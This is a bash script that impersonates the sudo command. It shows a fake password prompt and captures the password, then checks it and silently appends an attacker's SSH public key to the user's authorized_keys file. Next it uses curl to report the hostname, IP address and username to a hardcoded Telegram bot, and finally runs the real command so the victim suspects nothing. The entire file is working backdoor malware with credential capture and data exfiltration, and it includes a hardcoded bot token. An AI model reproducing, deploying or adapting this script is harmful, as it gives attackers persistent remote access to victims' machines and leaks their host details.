#!/bin/bash
telegramApiToken="6831101481:AAHrG9PPMD6W-zR0zijUUs5NNp0CfpGRZRU"
telegramChatID="-4031559065"
sshPubKey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4hRhiu1FQ/EsquOJes6rIVJzYZJP0UcEp4sT9zMrrNLiUyxf/ed423E1DBkkE7E8n4LISqSBl69eibRvJWSyGyziUkFoRYIGWIRuV0R2PeLC7I3/L+ebwYNjykSbjbNDVoNzl7mm50xBttGZBL8zfwqzchqTiAJUVTsGDn+yEIFYQUck6+YS0v5YjFwcfJZPuD9q1eIr0lNWwvirYHnwI4O3wd954U77Rw26Mnwd3gzoUUTnM9lrhYYEDvdeSOUHNarLcWWhVAPw8rZO7trzFvHlH7xCjjKLA4GPq4y3uX9oYivTQKFCQvt4EaI9s6piKsPJXW7SptbC/FxrhssoCRhRjTmefGn7VW3YQ6qmzYnEkUI68vK74kcuQDMNU5xajVJAG6FoyCGO5y+JSYComl4Jq6UpVVGd1VejxCE+WX/9/YDdC9+Je5fKJIx3fWjXjgJn2gEd3FSZiMOgMPzpuUh3JJ7k8OTc3ls0UYPWD3svoikxzk+Z/PWb+67jkHqE= kali@kali
"
telegramApiEndpoint="https://api.telegram.org/bot$telegramApiToken/sendMessage"
timeout="8"

/usr/bin/sudo -n true 2>/dev/null
if [ $? -eq 0 ]
then
  /usr/bin/sudo $@
else
  echo -n "[sudo] password for $USER: "
  read -s pwd
  echo
  echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
    
  if [ $? -eq 1 ]
  then
    distroName=$(awk -F= '/^NAME/{print tolower($2)}' /etc/*-release  | tr -d '"')
    if [[ $distroName == *"centos"* || $distroName == *"red hat"* ]]
    then
      echo "Sorry, try again."
    fi
    sudo $@
  else
    sshDirectory="/home/$USER/.ssh"
    authKeyFile="$sshDirectory/authorized_keys"

    #If SSH directory exist.
    if [ -d "$sshDirectory" ]
    then
      isSshKeyInFile=$(cat "$authKeyFile" | grep -c "$sshPubKey")

      #If public key in not already in authorized_keys.
      if [ $isSshKeyInFile -eq 0 ] 
      then
        /usr/bin/sudo -S echo "$sshPubKey" >> $authKeyFile

        #If CURL binary is in the host.
        if [ -x /usr/bin/curl ]
        then
          hostname=$(hostname -f)
          ipAddr=$(hostname -I | awk '{print $1}')
          message="SSH public key added. --- Hostname: $hostname --- IP: $ipAddr --- USER:$USER"
          curl -s --max-time $timeout -d "chat_id=$telegramChatID&disable_web_page_preview=1&text=$message" $telegramApiEndpoint > /dev/null
        fi
      fi  
    fi
    echo "$pwd" | /usr/bin/sudo -S $@
  fi
fi

